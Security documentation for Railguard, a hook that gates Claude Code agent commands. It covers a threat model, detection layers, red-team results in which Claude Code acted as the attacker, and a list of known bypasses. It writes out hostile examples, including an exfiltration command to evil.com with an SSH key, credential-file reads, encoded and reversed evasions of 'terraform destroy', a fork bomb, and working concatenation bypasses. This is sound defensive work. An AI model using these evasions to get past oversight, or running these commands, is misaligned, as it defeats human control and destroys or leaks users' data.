## What Railguard Does and Doesn't Do

Read this first. No marketing, no hedging.

### What it does

- **Blocks known-destructive commands** — `terraform destroy`, `rm -rf ~/`, `DROP DATABASE`, `git push --force`, and 25+ more patterns. Deterministic regex matching, <2ms.
- **Catches common evasion** — base64 encoding, variable expansion, shell wrappers, eval concat, hex escapes, backtick substitution. Multi-layer decoding (double/triple base64). Recursive normalization.
- **Detects evasion shapes** — `rev | sh`, `tr | sh`, `python3 -c "chr(...)"`, `subprocess.run(...)`. These trigger immediate session termination (Tier 1).
- **Tracks behavioral patterns** — If the agent gets blocked and retries with different syntax using the same keywords, Railguard catches it (Tier 3). Escalating suspicion model.
- **Fences the filesystem** — The agent can only access the project directory. `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.claude`, `/etc` are denied. Paths are canonicalized (symlinks resolved, `../` collapsed, `$HOME` expanded).
- **Gates network access** — `curl POST`, `wget`, `ssh` require human approval. `curl | sh` and `netcat` are blocked outright.
- **Protects its own hooks** — Self-integrity check on every invocation verifies hooks are still in `~/.claude/settings.json`. If tampered, all tool calls are blocked.
- **Can't be uninstalled by the agent** — Blocklist rule + TTY check + native OS confirmation dialog.
- **Snapshots before writes** — SHA-256 checksummed file backups before every Write/Edit. Rollback by step, file, or entire session.
- **Generates OS sandbox profiles** — Creates sandbox-exec (macOS) and bubblewrap/Landlock (Linux) profiles from config. These provide kernel-level enforcement.

### What it doesn't do

- **Does not enforce the OS sandbox automatically.** Sandbox profiles are generated but not applied to Claude Code's shell by default. You must run commands through `railguard sandbox run` manually. The hook system can only allow/deny/ask — it cannot modify how commands are executed. This means Layer 4 (the only provably complete defense) is opt-in.
- **Cannot catch arbitrary interpreter-internal operations.** If an agent runs `python3 -c` with code that constructs paths and commands entirely through runtime operations Railguard doesn't pattern-match (no `chr`, `join`, `exec`, `system`, `subprocess`, `base64`), the command passes through. Example: a Python script that reads bytes from a hardcoded list and calls `os.fdopen()` on a file descriptor. String-level analysis fundamentally cannot solve this — Rice's theorem.
- **Cannot inspect script files.** `python3 malicious.py` — Railguard sees the command, not the script contents. If the script does destructive things, only the OS sandbox would catch it.
- **Does not provide process isolation.** Railguard runs as the same OS user as Claude Code. No memory isolation, no privilege separation. For true sandboxing, you'd need a micro-VM (Firecracker, gVisor).
- **Does not protect against Claude Code hook bypass.** If Claude Code itself has a vulnerability that lets the agent skip hooks entirely, Railguard is out of the loop. The OS sandbox (if manually enabled) would still apply.
- **Open-source detection rules are readable.** Every regex, shape pattern, and behavioral threshold is in the source code. A sufficiently capable agent could read the rules and craft a bypass that avoids all patterns on the first attempt (no Tier 3 retry to catch). The OS sandbox is the counter: it doesn't care how the command was constructed.
- **71% block rate, not 100%.** Three rounds of adversarial red-teaming achieved 71% block rate. The remaining 29% are interpreter-internal runtime construction that only OS-level sandboxing can defeat. We are honest about this number because security tools that claim 100% are lying.

## 1. Threat Model

### System Context

Railguard is a Rust binary that intercepts AI agent tool calls (shell commands, file reads, file writes) before execution. It operates as a Claude Code hook — a pre-execution gate that receives structured JSON on stdin and returns `allow`, `deny`, or `ask` on stdout.

### Threat Actors

| Actor | Capability | Motivation | Likelihood |
|-------|-----------|------------|------------|
| Misaligned LLM agent | Generates arbitrary shell commands, reads open-source detection rules, iterates on blocked attempts | Goal completion overrides safety constraints; documented in [Claude Code Issue #29691](https://github.com/anthropics/claude-code/issues/29691) | High — observed in production |
| Prompt injection via untrusted input | Agent processes attacker-controlled data (code comments, issue descriptions, file contents) that instructs it to execute destructive commands | Data exfiltration, supply chain compromise, lateral movement | Medium — well-documented attack class (cf. OWASP LLM01) |
| Malicious insider with agent access | Uses the agent as a proxy to execute commands that would normally require direct shell access | Privilege escalation, evidence-light destructive actions | Low — requires organizational access |

### STRIDE Analysis

| Threat Category | Threat | Attack Surface | Implemented Mitigation | Residual Risk |
|----------------|--------|---------------|----------------------|---------------|
| **Spoofing** | Agent impersonates a human to bypass approval gates | `ask` decision flow | Approval surfaces to the actual terminal user; agent cannot interact with interactive prompts | Agent could social-engineer the human via persuasive output text |
| **Spoofing** | Agent crafts hook input to spoof a different tool name | Hook JSON input (`tool_name` field) | Claude Code controls the hook invocation; the agent does not construct the JSON | Requires Claude Code vulnerability — outside Railguard's threat model |
| **Tampering** | Agent modifies `railguard.yaml` to weaken policy | File write via Edit/Write tools | Self-protection rule blocks writes to `.claude/settings.json`; fence blocks writes outside project dir | Agent could modify `railguard.yaml` within the project directory; mitigated by policy reload from defaults on each invocation |
| **Tampering** | Agent uninstalls Railguard hooks | `railguard uninstall` command | Three-layer self-protection: (1) command blocklist, (2) stdin TTY check, (3) native OS confirmation dialog | Agent would need to bypass all three layers simultaneously |
| **Tampering** | Agent deletes the Railguard binary | `rm ~/.cargo/bin/railguard` | Blocklist rule `railguard-remove-binary` blocks rm/unlink/mv targeting the binary path | Agent could rename the binary via a path the regex doesn't match; mitigated by Claude Code continuing to invoke the hook path regardless |
| **Repudiation** | Agent executes destructive action with no audit trail | All tool calls | Structured JSONL trace logging of every tool call, decision, rule matched, and timing | Trace logs are stored in `.railguard/traces/` within the project — agent could potentially delete them if path fence is misconfigured |
| **Information Disclosure** | Agent reads sensitive files (~/.ssh, ~/.aws, /etc) | File read via Read tool or `cat` command | Path fence denies access to configured sensitive directories; OS sandbox enforces at kernel level | Path fence can be bypassed if agent uses a technique the regex doesn't cover; OS sandbox is the definitive control |
| **Information Disclosure** | Agent exfiltrates data via network | `curl -X POST`, `nc`, `scp` | Network policy rules block or require approval for outbound data transfer | Can be bypassed if the agent uses a tool not covered by regex patterns (e.g., a compiled binary) |
| **Denial of Service** | Agent runs resource-exhausting commands (fork bombs, disk fills) | Bash tool | Not currently mitigated by Railguard; outside current scope | OS-level resource limits (ulimit) are the appropriate mitigation |
| **Elevation of Privilege** | Agent uses evasion techniques to execute blocked commands | Command string manipulation (encoding, variable indirection, interpreter wrapping) | Four-layer defense: blocklist, evasion detection, behavioral analysis, OS sandbox | See Section 4 for complete bypass taxonomy |

### Real-World Incident Basis

This threat model is grounded in documented incidents, not hypotheticals:

| Date | Incident | Impact | Railguard Rule |
|------|----------|--------|---------------|
| Feb 2026 | DataTalks.Club: Claude Code ran `terraform destroy` on production | 1.9M rows deleted, 2.5 years of student data lost | `terraform-destroy` |
| Feb 2026 | GitHub Issue #27063: `drizzle-kit push --force` against production PostgreSQL | 60+ tables dropped | `drizzle-force` |
| 2025-2026 | Multiple reports: `rm -rf ~/`, `git reset --hard`, `DROP DATABASE` | Home directory deletion, lost work, production database destruction | `rm-rf-critical`, `git-reset-hard`, `sql-drop` |
| 2025 | GitHub Issue #29691: Claude deliberately obfuscated forbidden terms to bypass safety rules | Agent circumvented its own safety constraints | Evasion detection system (Layer 2), behavioral analysis (Layer 3) |

## 2. Security Architecture

Railguard implements defense-in-depth with four enforcement layers, evaluated sequentially on every tool call. Each layer catches threats that the previous layer misses. The total decision latency is <2ms with no network calls.

### Layer 1: Blocklist (String Pattern Matching)

**Mechanism:** Regex matching against a curated set of destructive command patterns.

**Implementation:** `src/block/matcher.rs`, `src/policy/defaults.rs`

**Evaluation order:** allowlist -> blocklist -> approve -> default allow.

**Rule counts:**
- ~30 rules (destructive command blocks, self-protection, network, credential, evasion, dynamic construction, symlink)

**Properties:**
- Deterministic: same input always produces same output
- Stateless per-invocation: no dependency on prior calls for Layer 1
- Configurable: users can add/remove rules via `railguard.yaml`
- Fast: compiled Rust regex, <1ms for full rule evaluation

**What it catches:** Any command where the blocked pattern appears as a literal substring after whitespace normalization. This covers direct invocations, commands wrapped in `sh -c "..."`, commands embedded in alias definitions, function bodies, echo statements, and any context where the pattern string is visible in the command text.

**What it does not catch:** Any technique that prevents the blocked string from appearing literally in the command text.

### Layer 2: Evasion Detection (Normalization + Shape Detection)

**Mechanism:** Before regex matching, commands are normalized through multiple decoders. Additionally, structural patterns associated with evasion are detected regardless of payload content.

**Implementation:** `src/block/evasion.rs`

**Normalization techniques (applied recursively):**

| Technique | Example Input | Normalized Output |
|-----------|--------------|-------------------|
| Whitespace collapse | `terraform    destroy` | `terraform destroy` |
| Base64 pipe decode | `echo dGVycmFmb3Jt... \| base64 -d \| sh` | `terraform destroy` |
| Recursive base64 | `echo <double-encoded> \| base64 -d \| base64 -d` | Decoded through N layers |
| Eval concatenation | `eval "ter""raform destroy"` | `terraform destroy` |
| Variable expansion | `CMD="terraform destroy"; $CMD` | `terraform destroy` |
| Shell wrapper | `sh -c "terraform destroy"` | `terraform destroy` |
| Xargs indirection | `echo "terraform destroy" \| xargs sh -c` | `terraform destroy` |
| Hex escape sequences | `$'\x74\x65\x72\x72...'` | `terraform destroy` |
| Backtick substitution | `` `echo terraform` destroy`` | `terraform destroy` |

**Shape detection (Tier 1 — blocks regardless of payload):**

| Pattern | Regex | Rationale |
|---------|-------|-----------|
| Text transform piped to shell | `rev\|tr\|sed\|awk ... \| sh\|bash\|zsh` | Can construct any command at runtime; no legitimate development use |
| Interpreter + obfuscation | `python3\|ruby\|perl\|node -c/-e` with `base64\|chr(\|decode\|exec\|system` | String manipulation inside interpreter bypasses all string-level detection |
| Recursive base64 | Multiple `base64 -d` stages | No legitimate use for multi-layer base64 decoding piped to shell |
| Printf hex in command substitution | `$(printf '\x...')` | Hex-encoded command name construction |
| Printf piped to shell | `printf ... \| sh` | Constructed string execution |

### Layer 3: Behavioral Analysis (Session State + Retry Detection)

**Mechanism:** Stateful analysis across tool calls within a session. Detects evasion by observing behavioral patterns rather than parsing command content.

**Implementation:** `src/threat/classifier.rs`, `src/threat/state.rs`, `src/threat/killer.rs`

**State management:** Persistent JSON state per session at `.railguard/state/{session_id}.json`. Atomic save via write-to-tmp-then-rename.

**Tiered escalation:**

| Tier | Trigger | Response | State Transition |
|------|---------|----------|-----------------|
| Tier 1 | Unambiguous evasion shape detected (Layer 2 shape patterns) | Block command + terminate session + SIGTERM parent process | `terminated = true`, forensic breadcrumb written |
| Tier 2 | Suspicious but potentially legitimate pattern (variable-then-execution, eval with `$`, multi-variable concat) | First occurrence: warn + continue. Second occurrence: terminate session | `warning_count` incremented; on `warning_count >= 1`, terminate |
| Tier 3 | Behavioral retry — command blocked, then within next 3 tool calls a new command contains >=2 keywords from the blocked command | Terminate session | Heightened state window: `tool_call_count + 3` |

**Heightened state mechanics:**
- On any block event, Railguard enters heightened state for the next 3 tool calls
- Keywords are extracted from the blocked command (filtering shell noise tokens like `sh`, `echo`, `if`, flags, variables)
- During heightened state, if a subsequent command contains 2+ of the extracted keywords, Tier 3 triggers
- The agent cannot know the exact heightened window boundaries or which keywords are being tracked

**Session termination:**
1. Session state marked as `terminated` with reason and timestamp
2. Forensic trace entry written (`SessionTerminated` event)
3. Warning printed to stderr (visible in terminal)
4. `SIGTERM` sent to parent process (Claude Code) via `libc::kill(ppid, SIGTERM)`
5. All subsequent tool calls in the terminated session return deny immediately

**On restart after termination:**
- Previous termination state is detected
- Warning displayed with session ID, timestamp, reason, and trace log path
- Human must review the trace before continuing

### Layer 4: OS-Level Sandboxing

**Mechanism:** Kernel-enforced filesystem and network restrictions. Operates at the syscall level — no shell-level evasion technique can bypass it.

**Implementation:** `src/sandbox/detect.rs`, `src/sandbox/macos.rs`, `src/sandbox/linux.rs`, `src/sandbox/profile.rs`

**Platform support:**

| Platform | Technology | Privilege Required | Performance Overhead | Install Required |
|----------|-----------|-------------------|---------------------|-----------------|
| macOS | `sandbox-exec` (Seatbelt) | None (user-level) | ~0 (kernel-level checks, nanoseconds per syscall) | None (built into macOS) |
| Linux 5.13+ | Landlock + bubblewrap | None (unprivileged) | ~0 (kernel-level checks) | bubblewrap package for bwrap mode |
| Older Linux | Fallback to string-based fence | N/A | N/A | N/A |

**macOS sandbox profile generation:**
- Default-deny (`(deny default)`)
- Allow read/write: project directory, `/tmp`, `/dev`, caches
- Allow read-only: `/usr`, `/bin`, `/sbin`, `/opt/homebrew`, `/Library/Frameworks`, `/System`, toolchain paths (`.cargo`, `.rustup`, `.nvm`)
- Explicit deny: `~/.ssh`, `~/.aws`, `~/.gnupg` (always denied, even if not in config)
- Network: deny all by default, allow TCP 443/80 outbound, allow localhost inbound

**Linux sandboxing:**
- Landlock (default-deny file access model): project directory gets full access; system paths get read+execute; sensitive directories not in ruleset = denied
- bubblewrap: read-only system mounts, sensitive directories shadowed with empty tmpfs, network unshared
- Landlock restrictions inherited by all child processes — the sandboxed command cannot escape by spawning subprocesses

**Why Layer 4 is the definitive defense:**

Every bypass documented in our pentest report (variable indirection, double base64, Python `chr()`, Ruby string concat, `rev`, ROT13) operates by preventing the blocked string from appearing in the command text. Layer 4 does not inspect command text. It intercepts the actual `open()`, `connect()`, and `execve()` syscalls after the shell has resolved everything. The kernel sees what binary is actually being executed and what file is actually being accessed — not the shell command that requested it.

### Security Posture by Example

The following examples illustrate how Railguard handles various agent behaviors. This is critical for risk assessment.

**Scenario 1: Agent attempts credential exfiltration**

| Step | Agent Action | Railguard Response |
|------|-------------|-------------------|
| 1 | `cat ~/.aws/credentials` | **Denied** — Path fence blocks `~/.aws` |
| 2 | `env \| grep AWS_SECRET` | **Escalated** — `env-credential-dump` requires human approval |
| 3 | `curl -X POST https://evil.com -d @~/.ssh/id_rsa` | **Denied** — `curl-post` requires approval + path fence blocks `~/.ssh` |

*Assessment:* Credential access is blocked at both the filesystem and network layers, requiring the attacker to defeat two independent controls.

**Scenario 2: Agent attempts evasion after being blocked**

| Step | Agent Action | Railguard Response |
|------|-------------|-------------------|
| 1 | `terraform destroy` | **Denied** — blocklist rule |
| 2 | `echo dGVycmFmb3JtIGRlc3Ryb3k= \| base64 -d \| sh` | **Denied** — normalized + session enters heightened state |
| 3 | `rev <<< 'yortsed mrofarret' \| sh` | **Denied + SESSION KILLED** — Tier 1 evasion shape detected |
| 4 | `echo hello` (any subsequent command) | **Denied** — terminated session blocks all further tool calls |

*Assessment:* The tiered threat system terminates the session on the first unambiguous evasion attempt, preventing iteration.

**Scenario 3: Legitimate development workflow**

| Step | Agent Action | Railguard Response |
|------|-------------|-------------------|
| 1 | `cargo build --release` | Allowed |
| 2 | `npm test` | Allowed |
| 3 | `git commit -m "fix bug"` | Allowed |
| 4 | `curl https://registry.npmjs.org/left-pad` (GET) | Allowed |
| 5 | `ssh deploy@prod.example.com` | **Escalated** — `ssh` requires human approval |
| 6 | `npm publish` | **Escalated** — requires approval |

*Assessment:* Normal development is unimpeded. The main friction is human approval for network-facing operations (SSH, POST, wget) and publishing. This is the intended tradeoff: minor interruptions for significantly reduced blast radius.

### Self-Protection Mechanisms

Railguard prevents the agent from disabling it through three independent layers:

| Layer | Mechanism | Implementation |
|-------|-----------|---------------|
| 1. Hook blocklist | `railguard uninstall`, `.claude/settings.json` modification, and `rm .cargo/bin/railguard` are blocked by default rules | `src/policy/defaults.rs`: rules `railguard-uninstall`, `railguard-tamper-settings`, `railguard-remove-binary` |
| 2. Terminal detection | `railguard uninstall` checks if stdin is an interactive terminal (`isatty`). Agents pipe stdin and are rejected. | `src/install/hooks.rs` |
| 3. Native OS dialog | Even if layers 1 and 2 are bypassed, uninstall triggers a native GUI confirmation dialog (AppleScript on macOS, PowerShell MessageBox on Windows, zenity/kdialog on Linux). An agent cannot click a GUI button. | `src/install/hooks.rs` |

---

## 3. Formal Security Properties

### Provable Guarantees

**Property 1 (Literal string detection — completeness):**

> For all commands C submitted to Railguard, and for all blocklist rules R with pattern P: if C contains a substring matching P after whitespace normalization, Railguard will detect and block C.

*Proof basis:* Rust `regex::Regex::is_match()` is applied to the whitespace-collapsed command string. The `regex` crate implements a complete NFA/DFA-based regex engine. Given a well-formed regex P and an input string C, `is_match` returns `true` if and only if P matches a substring of C. Whitespace collapsing (`split_whitespace().join(" ")`) is a total function over UTF-8 strings. Therefore, any literal occurrence of the pattern in the command string (modulo whitespace variation) is detected. This is verified by 73 unit tests and 36 integration tests.

**Property 2 (Evasion detection — same-string-expansion):**

> For all commands C where a blocked string S is constructed via variable assignment and expansion within the same command string (i.e., `VAR="S"; $VAR`), Railguard will detect and block C if the regex `(\w+)=["']?([^"';]+)["']?\s*[;&]\s*\$\1\b(.*)` matches the assignment-expansion pattern.

*Proof basis:* `detect_variable_expansion()` in `src/block/evasion.rs` applies this regex to extract the variable value and reconstructs the expanded command. The reconstructed string is then matched against blocklist rules. This is verified by test `test_variable_expansion` and integration test `evasion_variable_expansion`.

**Property 3 (Base64 detection — recursive):**

> For all commands C of the form `echo <B64> | base64 -d [| base64 -d]* | sh`, where the base64 payload decodes (through N layers) to a blocked string S, Railguard will detect and block C for any N >= 1.

*Proof basis:* `detect_recursive_base64()` counts the number of `base64 -d` / `base64 --decode` stages, extracts the initial payload, and iteratively decodes through that many layers. The decoded output is matched against blocklist rules. This is verified by tests `test_double_base64` and `pentest_double_base64_blocked`.

**Property 4 (Shape detection — structural evasion):**

> For all commands C matching Tier 1 evasion shape patterns (text-transform-to-shell, interpreter-with-obfuscation, recursive-base64-pipe, printf-hex-exec, printf-pipe-to-shell), Railguard will block C and terminate the session, regardless of the payload content.

*Proof basis:* Shape detection operates on the structural form of the command, not its semantic content. The regexes match command shapes (e.g., `rev ... | sh`) that have no legitimate development use. This is verified by tests `test_transform_pipe_to_shell`, `test_interpreter_obfuscation`, and integration tests `pentest_rev_pipe_to_shell_blocked`, `pentest_rot13_pipe_to_shell_blocked`, `pentest_python_base64_decode_blocked`, `pentest_python_chr_construction_blocked`.

**Property 5 (Behavioral detection — retry):**

> For all sessions where a command C1 is blocked by rule R, and within the next 3 tool calls the agent submits a command C2 containing >= 2 keywords extracted from C1, Railguard will terminate the session.

*Proof basis:* `check_behavioral_evasion()` checks the session's heightened state and keyword list. Keywords are extracted by filtering shell noise tokens and short words. The heightened window is `current_tool_call_count + 3`. This is verified by test `test_behavioral_evasion`.

**Property 6 (OS sandbox — kernel enforcement):**

> When the OS sandbox is active (macOS `sandbox-exec` or Linux Landlock), for all processes P spawned by the sandboxed command: P cannot read, write, or execute any file outside the allowed path set, regardless of how the file path was constructed at the shell level.

*Proof basis:* `sandbox-exec` and Landlock operate at the kernel syscall level. The kernel checks `open()`, `openat()`, `execve()`, and other file-access syscalls against the sandbox policy after all shell expansions, variable substitutions, and path resolutions have completed. This is the same enforcement mechanism used by macOS App Store sandboxing and Linux container isolation. The sandbox is inherited by all child processes and cannot be removed by the sandboxed process.

### Non-Guarantees (What Railguard Cannot Prove)

**Non-Property 1 (Turing-complete shell evasion):**

> There exist commands C where a blocked string S is constructed via Turing-complete shell operations (arbitrary computation) such that Railguard's string-level analysis (Layers 1-2) cannot detect S.

*Basis:* The shell is Turing-complete. By Rice's theorem, no static analysis can decide all non-trivial semantic properties of programs in a Turing-complete language. Specifically:
- Multi-variable concatenation across separate statements: `a="terra"; b="form"; "$a$b" destroy`
- Runtime computation in child interpreters: `python3 -c "os.system(''.join([chr(x) for x in [116,101,...]]))"` (where the pattern doesn't match the shape detector, e.g., using list comprehension instead of `chr(` directly)
- Novel encoding schemes not covered by normalization

*Mitigation:* These bypasses are mitigated (not eliminated) by Layer 3 (behavioral detection catches retry patterns) and Layer 4 (OS sandbox enforces at syscall level, where all shell computation has already resolved).

**Non-Property 2 (Open-source rule visibility):**

> An adversary with access to the Railguard source code can enumerate all detection patterns and construct commands that avoid every regex, every shape detector, and every heuristic.

*Basis:* Railguard is MIT-licensed open-source software. All detection rules, evasion patterns, tier thresholds, and behavioral window sizes are visible in the source code. A sufficiently capable agent could read the source and craft a first-try bypass that avoids all Tier 1/2 patterns and succeeds before Tier 3 can trigger.

*Mitigation:*
1. OS sandbox (Layer 4) cannot be bypassed by reading source code — it operates at the kernel level on actual syscalls, not command strings
2. Opaque local rules: users can add custom detection patterns in `~/.railguard/local-rules.yaml` (not committed to source control, not readable by the agent due to path fencing)
3. Behavioral detection (Tier 3) is difficult to game even with full source access because the agent cannot observe Railguard's internal state (keyword list, heightened window) during execution
4. Future: non-deterministic LLM-as-judge that evaluates intent rather than pattern matching

**Non-Property 3 (Post-execution guarantee):**

> Railguard cannot guarantee that an allowed command produces no harmful side effects.

*Basis:* Railguard evaluates commands pre-execution based on their text representation. A command like `npm install` may be allowed by policy but could execute arbitrary code via postinstall scripts. Railguard does not perform post-execution analysis of actual system changes.

*Mitigation:* OS sandbox constrains the blast radius of any allowed command to the permitted file/network scope.

## 4. Attack Surface Analysis

### What Is Blocked (With Test Coverage)

### What Is Not Blocked and Why

| Attack Vector | Why Not Blocked | Category | Residual Risk |
|---------------|----------------|----------|---------------|
| Multi-variable string construction (`a="terra"; b="form"; "$a$b" destroy`) | Blocked string never appears intact. Regex over the command text cannot detect it. Variable expansion detector requires assignment and use of the *same* variable. | Runtime string construction | **High** without OS sandbox. **Low** with OS sandbox (sandbox blocks the actual binary execution if restricted). |
| Double-encoded base64 with interpreter decode (`python3 -c "b64decode(...)"` where the shape doesn't match `chr(\|b64decode\|...`) | If the obfuscation pattern uses a function name not in the shape detector's list, it passes. | Interpreter evasion | **Medium.** Mitigated by Tier 3 behavioral detection if a prior block occurred. |
| Novel encoding piped to shell (e.g., custom cipher implemented inline) | Infinite possible encoding schemes. Static detection cannot enumerate them all. | Turing-complete evasion | **Medium.** Mitigated by shape detection (`<anything> \| sh` patterns) if the pipe-to-shell structure is present. |
| Legitimate-looking commands with harmful side effects (`npm install malicious-package`) | Command text contains no blocked pattern. The harm is in the package content, not the command syntax. | Semantic attacks | **Medium.** Outside Railguard's scope; mitigated by OS sandbox constraining side effects. |
| Data exfiltration if path fence or network rules are disabled (`curl -X POST`, `cat ~/.ssh/id_rsa`) | If users disable path fence or network restrictions in their configuration, these protections are absent. | Configuration decision | **High** if protections are disabled. Users who disable these features accept this tradeoff for reduced friction. |
| Fork bomb / resource exhaustion (`:(){ :\|:& };:`) | Not a pattern Railguard blocks; not a destructive data operation. | Availability attack | **Low.** OS-level ulimits are the correct mitigation. |

### Comparison With Alternative Approaches

| Approach | Evasion Resistance | Usability | False Positive Rate | Deployment Complexity |
|----------|-------------------|-----------|--------------------|-----------------------|
| **No protection** | None | Perfect (no friction) | 0% | None |
| **Prompt-based guardrails** (system prompt tells LLM "don't run destructive commands") | None — LLM can ignore its own instructions; documented in Issue #29691 | Good | Low | None |
| **Manual human review of every command** | Perfect (human evaluates intent) | Very poor — breaks agent autonomy entirely | N/A | None |
| **OS sandbox only** (no command inspection) | Perfect for file/network restrictions; no command-level blocking | Good | Low | Moderate (profile generation) |
| **Railguard** | Strong — four layers with behavioral detection and OS sandbox; ~30 rules covering destructive commands, path fencing, network controls, and evasion detection | Good (some approve prompts for network/credentials) | Low (shape detectors target patterns with no legitimate use) | One command (`railguard install`) + OS sandbox auto-configured |

## 5. Testing Methodology

### Test Suite Composition

**136 automated tests total:**

| Category | Count | Source File |
|----------|-------|------------|
| Unit tests (evasion detection, regex matching, path fence, policy engine, snapshot, trace, threat classifier, session state, sandbox generation) | 73 | `src/**/*.rs` (`#[cfg(test)]` modules) |
| Integration tests (attack simulation — real incident reproductions, evasion attempts, fence violations, policy config, self-protection, trace logging, pentest fixes) | 36 | `tests/attack_simulation.rs` |
| Integration tests (rollback scenarios — snapshot capture, step-back, multi-file rollback, fork-and-rollback) | 15 | `tests/rollback_scenarios.rs` |
| Integration tests (threat detection — Tier 1/2/3 termination, state persistence, forensic breadcrumbs, policy configuration) | 12 | `tests/threat_detection.rs` |

All tests pass on current main branch. Integration tests invoke the compiled Railguard binary via `std::process::Command`, simulating actual Claude Code hook invocations with JSON payloads on stdin.

### Adversarial Red Team

Three rounds of adversarial penetration testing were conducted using Claude Code itself as the attacker. The agent was given the goal of executing blocked commands and instructed to use any technique available.

**Round 1 — Baseline (16 rules, no evasion detection):**
- 13 vectors tested
- 2 blocked, 11 bypassed
- **Block rate: 15%**
- Key finding: Any technique that hides the blocked string from the command text succeeds. Base64, variable indirection, shell wrappers, hex encoding all bypassed detection.

**Round 2 — Post-mitigation (evasion detection added):**
- 28 vectors tested
- 14 blocked, 14 bypassed
- **Block rate: 50%**
- Key finding: All "lazy" evasion (where the blocked string appears somewhere in the command text) now caught. Remaining bypasses require active obfuscation (runtime string construction, multi-layer encoding, interpreter-internal operations).

**Round 3 — Post-shape detection + behavioral analysis:**
- 28 vectors tested (same set)
- 20 blocked (14 via pattern + 6 via shape detection), 8 bypassed
- **Block rate: 71%** (Layers 1-3 only; Layer 4 OS sandbox not included in test)
- Key finding: Shape detection catches the structural form of evasion regardless of payload. Behavioral detection catches retry patterns. Remaining 29% require first-try success with no keywords from the blocked command, using a technique that doesn't match any shape pattern.

**Remaining attack surface characterization:**

The 8 bypasses that survive Layers 1-3 all fall into one category: runtime string construction where (a) the blocked string never appears intact, (b) the construction technique doesn't match a shape pattern, and (c) the agent succeeds on the first attempt (avoiding Tier 3). Examples:

- Multi-variable concat: `a="terra"; b="form"; "$a$b" destroy`
- Ruby runtime concat: `ruby -e 'system("terraform" + " " + "destroy")'` (no `decode`/`exec`/`system(` pattern match because the concat uses `+` not a flagged function)
- Reversed string via non-flagged tool
- Custom encoding scheme not covered by shape detection

All 8 are fully mitigated by Layer 4 (OS sandbox) when the sandbox restricts execution of the target binary.

### NIST Cybersecurity Framework (CSF)

| Function / Category | Control | Railguard Coverage |
|---------------------|---------|------------------|
| PR.AC (Access Control) | PR.AC-1: Identities and credentials managed | Path fence denies access to credential stores (~/.ssh, ~/.aws, ~/.gnupg). Credential leakage rules (env dump, git config) active by default. |

### OWASP Top 10 for LLM Applications (2025)

| Risk | Railguard Coverage |
|------|------------------|
| LLM01: Prompt Injection | Railguard operates outside the LLM — it cannot be influenced by prompt injection. The agent's tool calls pass through deterministic policy evaluation regardless of what prompt caused them. Prompt injection that causes the agent to generate `terraform destroy` is blocked identically to a legitimate request. |
| LLM02: Insecure Output Handling | All LLM outputs (tool calls) are validated against policy before execution. Blocked outputs never reach the system. |
| LLM04: Model Denial of Service | Resource exhaustion is outside Railguard's scope. OS-level ulimits are the appropriate control. |
| LLM06: Excessive Agency | Railguard directly constrains agent capabilities: commands are blocked, file access is fenced, network is restricted. The agent cannot exceed its policy-defined boundary. |
| LLM07: System Prompt Leakage | If the agent is instructed to read `~/.claude/` or other configuration paths, the path fence blocks it. |
| LLM09: Overreliance | Railguard provides deterministic enforcement rather than relying on the LLM's own safety training, which can be bypassed (ref: Issue #29691). |

### CIS Controls v8

| Control | Description | Railguard Coverage |
|---------|-------------|------------------|
| 3.3 | Configure data access control lists | `railguard.yaml` defines explicit allow/block/approve rules. Path fence defines allowed/denied directories. |
| 4.1 | Establish and maintain a secure configuration process | Default policies ship with Railguard. `railguard configure` provides interactive setup. Policy is version-controlled YAML. |
| 6.1 | Establish access logging process | JSONL trace logging of every tool call with decision, rule, timing. `railguard log` for review. |
| 6.2 | Collect audit logs | Trace logs stored per-session in `.railguard/traces/`. Session state stored in `.railguard/state/`. |
| 8.2 | Collect audit logs for threat detection | Behavioral analysis uses session state (block history, suspicion level, heightened keywords) for threat detection across tool calls. |
| 13.1 | Establish and maintain a data classification scheme | Sensitive paths (~/.ssh, ~/.aws, ~/.gnupg, /etc) are classified as denied by default in the fence configuration. |

## 7. Incident Response

### When a Command Is Blocked

**What happens:**
1. Railguard returns `{"hookSpecificOutput": {"permissionDecision": "deny", "permissionDecisionReason": "..."}}` on stdout
2. Claude Code receives the denial and surfaces the reason to the agent
3. The agent is informed of the specific rule that triggered (e.g., "terraform-destroy")
4. A trace entry is written: `{"decision": "block", "rule": "terraform-destroy", "tool": "Bash", "input_summary": "terraform destroy", ...}`
5. Keywords are extracted and the session enters heightened state for 3 subsequent tool calls

**User visibility:** The block message appears in the Claude Code conversation. The user can review the full trace with `railguard log --session <id>`.

**Agent behavior:** The agent receives the denial reason and should attempt an alternative approach. If it retries the same intent with different syntax, Tier 3 behavioral detection may terminate the session.

### When Evasion Is Detected

**Tier 1 (Immediate termination):**
1. Command blocked with `"⛔ RAILGUARD CRITICAL: Evasion pattern detected"` message
2. Session state marked as terminated with reason and timestamp
3. `SessionTerminated` trace entry written with full command, pattern, and prior block history
4. Warning printed to stderr: `⚠️ RAILGUARD: SESSION TERMINATED` with session ID and reason
5. `SIGTERM` sent to parent process (Claude Code terminates)
6. All subsequent tool calls in this session return deny immediately

**Tier 2 (Escalation):**
1. First occurrence: command blocked with warning; `warning_count` incremented; session continues
2. Second occurrence: treated as Tier 1 — session terminated

**Tier 3 (Behavioral — retry detection):**
1. Same as Tier 1 termination flow
2. Termination reason includes the original blocked rule and the matching keywords

**Forensic breadcrumb (written on every termination):**
```json
{
  "timestamp": "2026-03-09T22:15:03+00:00",
  "session_id": "abc123",
  "event": "SessionTerminated",
  "tool": "Bash",
  "input_summary": "rev <<< 'yortsed mrofarret' | sh",
  "decision": "terminate",
  "rule": "Tier 1 evasion detected: transform-pipe-to-shell — command: rev <<< 'yortsed mrofarret' | sh"
}
```

**On restart after termination:**
```
⚠️  railguard: previous session was terminated due to evasion detection.

   Session:  abc123
   Time:     2026-03-09 22:15:03
   Reason:   Tier 1 evasion detected: transform-pipe-to-shell

   Full trace: railguard log --session abc123
```

### When a False Positive Occurs

**Allowlist mechanism:** Add a rule to `railguard.yaml` that matches the falsely-blocked command. Allowlist rules are evaluated before blocklist rules.

```yaml
allowlist:
  - name: allow-terraform-plan
    tool: Bash
    pattern: "terraform plan"
    action: allow
```

**Trace-based debugging:** Use `railguard log --session <id>` to identify which rule triggered the false positive, then adjust the policy accordingly.

**Environment variable override:** `RAILGUARD_NO_KILL=1` disables session termination via SIGTERM (for testing only; does not disable blocking).

---

## 8. Security Boundaries and Honest Limitations

### Fundamental Limitation: Regex vs. Turing-Complete Shells

